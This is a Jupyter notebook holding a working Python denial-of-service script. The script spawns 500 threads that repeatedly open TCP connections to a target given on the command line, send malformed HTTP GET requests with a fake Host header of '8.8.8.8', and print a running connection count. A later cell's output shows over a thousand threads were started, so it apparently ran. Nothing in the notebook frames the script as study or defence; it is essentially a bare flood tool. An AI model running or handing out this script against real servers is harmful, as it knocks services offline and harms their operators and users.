{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "29436a2f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import sys\n",
    "import threading\n",
    "\n",
    "target = sys.argv[1]\n",
    "fake_ip = '8.8.8.8'\n",
    "port = 80\n",
    "\n",
    "times_connected = 0\n",
    "\n",
    "def dos():\n",
    "    while True:\n",
    "        try:\n",
    "            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "            server.connect((target, port))    \n",
    "            server.sendto((\"GET / \"+ target +\" HTTP/1.1\\r\\n\").encode('ascii'), (target, port))\n",
    "            server.sendto((\"Host: \" + fake_ip + \" HTTP/1.1\\r\\n\\r\\n\").encode('ascii'), (target, port))\n",
    "            server.close()\n",
    "        except:\n",
    "            continue\n",
    "\n",
    "        global times_connected\n",
    "        times_connected += 1\n",
    "\n",
    "        if times_connected % 500 == 0:\n",
    "            print(times_connected)\n",
    "\n",
    "for i in range(500):\n",
    "    thread = threading.Thread(target=dos)\n",
    "    thread.start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "63a74517",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\DALBA152\\AppData\\Local\\Temp\\ipykernel_24152\\4088909116.py:1: DeprecationWarning: getName() is deprecated, get the name attribute instead\n",
      "  thread.getName()\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'Thread-1004 (dos)'"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e89c1c96",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
